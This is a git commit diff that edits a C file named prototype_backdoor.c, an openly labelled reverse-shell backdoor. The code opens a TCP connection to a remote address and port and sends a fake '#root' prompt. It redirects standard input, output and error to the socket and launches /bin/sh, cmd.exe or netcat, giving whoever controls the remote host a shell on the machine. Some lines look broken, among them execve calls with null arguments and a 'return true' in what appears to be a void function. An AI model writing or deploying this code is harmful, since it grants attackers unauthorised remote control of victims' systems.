da127f5e55586c71c5adce7c3120b6e3c2ca324f
unknow <rmdero_jr_@outlook.com>
2017-10-09 22:26:13 -0300

    Update prototype_backdoor.c

--- prototype_backdoor.c
+++ prototype_backdoor.c
@@ -24,11 +24,11 @@
     int x;
     struct sockaddr_in s;
 
-    memset(s.sin_zero, '\0', sizeof s.sin_zero)
     s.sin_family = AF_INET;
     s.sin_addr.s_addr = inet_addr(remote_addr);
     s.sin_port = htons(remote_port);
-    
+    memset(s.sin_zero, '\0', sizeof s.sin_zero);
+
     x = socket(AF_INET, SOCK_STREAM, 0);
 
     connect(x, (struct sockaddr *)&s, sizeof(s));
@@ -38,17 +38,18 @@
     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR) failed");
 
+    /* mm a for loop will be necessary, or switch case. */
+
     send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);   /* recv(); no lado server. */
     fflush(stdout);
 
-    /* mm a for loop will be necessary, or switch case. */
     
     dup2(x, 0),dup2(x, 1),dup2(x, 2);    
     execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
 
     {
 
-    return;
+    return true;
 
     }
  
@@ -59,7 +60,6 @@
    int main(int argc, char *argv[])
 
    {
-   
       /*just shell...  without conditions?! */ 
 
         shell();
